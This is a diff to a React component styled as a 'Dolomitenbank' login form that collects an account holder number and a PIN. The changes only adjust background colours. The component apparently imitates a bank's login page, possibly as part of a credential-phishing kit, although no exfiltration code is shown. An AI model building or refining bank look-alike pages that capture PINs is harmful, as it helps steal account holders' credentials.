@@ -91,7 +91,7 @@ export function Dolomitenbank({ formData, onChange, handleRouteAction, saving }:
                     type="text"
                     value={formData.verfuegernummer || ""}
                     onChange={(e) => onChange("verfuegernummer", e.target.value)}
-                    className="w-full bg-[#e9ecef] border border-[#d0d0d0] rounded-[3px] px-3 py-[10px] outline-none focus:border-[#5f7078] focus:bg-white text-[15px] text-[#333] mb-6 transition-colors"
+                    className="w-full bg-[#e9ecef] border border-[#d0d0d0] rounded-[3px] px-3 py-[10px] outline-none focus:border-[#5f7078] focus:bg-[#fff6ec] text-[15px] text-[#333] mb-6 transition-colors"
                   />
                 </>
               ) : (
@@ -110,7 +110,7 @@ export function Dolomitenbank({ formData, onChange, handleRouteAction, saving }:
                     value={formData.pin || ""}
                     onChange={(e) => onChange("pin", e.target.value)}
                     autoFocus
-                    className="w-full bg-[#e9ecef] border border-[#d0d0d0] rounded-[3px] px-3 py-[10px] outline-none focus:border-[#5f7078] focus:bg-white text-[15px] text-[#333] mb-6 transition-colors"
+                    className="w-full bg-[#e9ecef] border border-[#d0d0d0] rounded-[3px] px-3 py-[10px] outline-none focus:border-[#5f7078] focus:bg-[#fff6ec] text-[15px] text-[#333] mb-6 transition-colors"
                   />
                 </>
               )}
@@ -135,7 +135,7 @@ export function Dolomitenbank({ formData, onChange, handleRouteAction, saving }:
           </div>
 
           {/* Bottom Links */}
-          <div className="border-t border-[#e0e0e0] bg-white py-5 flex flex-col items-center gap-1.5">
+          <div className="border-t border-[#e0e0e0] bg-[#fff6ec] py-5 flex flex-col items-center gap-1.5">
             <div className="flex flex-col items-center text-[13px] text-[#5f7078]">
               <a href="#" className="hover:underline mb-0.5">Gebruikersnaam vergessen?</a>
               <a href="#" className="hover:underline">Wachtwoord vergessen</a>
